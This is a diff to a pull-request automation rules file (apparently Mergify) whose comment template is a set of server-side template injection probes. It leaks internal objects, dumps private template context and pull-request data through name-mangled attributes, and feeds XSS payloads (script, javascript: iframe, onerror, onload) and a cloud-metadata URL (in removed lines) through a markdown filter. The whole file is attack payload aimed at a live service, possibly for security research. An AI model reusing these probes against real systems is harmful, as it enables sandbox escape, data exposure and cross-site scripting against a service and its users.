@@ -1,18 +1,23 @@
 pull_request_rules:
-  - name: ssti-oracle-v12-8321
+  - name: ssti-oracle-v13-31205
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T ORACLE v12 ===
-          [O1] lipsum-addr: {{ '%s' | format(lipsum) | default('') }}
-          [O2] cycler-addr: {{ '%s' | format(cycler) | default('') }}
-          [O3] namespace-addr: {{ '%s' | format(namespace) | default('') }}
-          [O4] joiner-inst: {{ '%s' | format(joiner()) | default('') }}
-          [O5] cycler-inst: {{ '%s' | format(cycler('a','b')) | default('') }}
-          [O6] ns-attrs: {{ namespace(c=cycler, l=lipsum, j=joiner, n=namespace, r=range)._Namespace__attrs | default('') }}
-          [O7] ns-pr-data: {{ namespace(a=author, b=body, f=files, h=head, t=title, n=number)._Namespace__attrs | default('') }}
-          [O8] md-dos-h99: {{ '<h99999>X</h99999>' | markdownify | default('') }}
-          [O9] md-dos-img: {{ '<img src=http://169.254.169.254/latest/meta-data/>' | markdownify | default('') }}
-          [O10] md-script: {{ '<script>alert(1)</script>' | markdownify | default('') }}
-          [O11] tr-context: {{ self._TemplateReference__context | pprint | default('') }}
+          === G4o7T v13 SAFE ORACLES ===
+          [O1] lipsum-fn: {{ '%s' | format(lipsum) }}
+          [O2] cycler-cls: {{ '%s' | format(cycler) }}
+          [O3] namespace-cls: {{ '%s' | format(namespace) }}
+          [O4] joiner-cls: {{ '%s' | format(joiner) }}
+          [O5] range-fn: {{ '%s' | format(range) }}
+          [O6] joiner-inst: {{ '%s' | format(joiner()) }}
+          [O7] cycler-inst: {{ '%s' | format(cycler('a','b')) }}
+          [O8] namespace-inst: {{ '%s' | format(namespace()) }}
+          [O9] ns-globals: {{ namespace(c=cycler, l=lipsum, j=joiner, n=namespace, r=range)._Namespace__attrs }}
+          [O10] ns-pr-data: {{ namespace(author=author, body=body, files=files)._Namespace__attrs }}
+          [O11] md-h99: {{ '<h99999>X</h99999>' | markdownify }}
+          [O12] md-script: {{ '<script>alert(1)</script>' | markdownify }}
+          [O13] md-iframe: {{ '<iframe src=javascript:alert(1)>' | markdownify }}
+          [O14] md-img: {{ '<img src=x onerror=alert(1)>' | markdownify }}
+          [O15] md-svg: {{ '<svg onload=alert(1)>' | markdownify }}
+          [O16] tr-context: {{ '%s' | format(self._TemplateReference__context) }}
